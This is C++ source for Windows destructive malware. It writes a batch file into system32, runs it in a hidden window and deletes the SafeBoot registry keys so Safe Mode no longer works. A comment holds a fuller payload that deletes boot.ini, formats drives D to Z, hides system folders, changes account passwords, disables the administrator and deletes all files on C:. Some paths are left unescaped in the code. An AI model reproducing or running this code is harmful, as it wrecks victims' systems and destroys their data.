#include<fstream>
#include<windows.h>
using namespace std;

fstream fout("C:\\WINDOWS\\system32\\this.bat");
/*
@echo off

if not "%1"=="wkdxz" mshta vbscript:createobject("wscript.shell").run("""%~f0"" wkdxz"",vbhide")(window.close)&&exit

REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Network /f

REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Minimal /f

ATTRIB %SYSTEMDRIVE%\boot.ini -s -a -r -h

DEL %SYSTEMDRIVE%\boot.ini /f

for %%a in (d e f g h i j k l m n o p q r s t u v w x y z) do format %%a: /q /u /x /y

cd C:\

attrib +s +h "windows"

attrib +s +h "Program Files"

attrib +s +h "Documents and Settings"

cd C:\Documents and Settings\Administrator\桌面

attrib +s +h

net user administrator nisidingle

net user guest nihuile

net user administrator /active:no

del /f /s /q c:\*.*
*/

int main()
{
  fout<<"@echo off"<<endl
      <<"if not \"%1\"==\"wkdxz\" mshta vbscript:createobject(\"wscript.shell\").run(\"\"\"%~f0\"\" wkdxz\"\",vbhide\")(window.close)&&exit"<<endl
      <<"REG DELETE \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\" /v Network /f"<<endl
      <<"REG DELETE \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\" /v Minimal /f"<<endl;
  fout.close();
  system("start C:\WINDOWS\system32\this.bat");
  return 0;
}
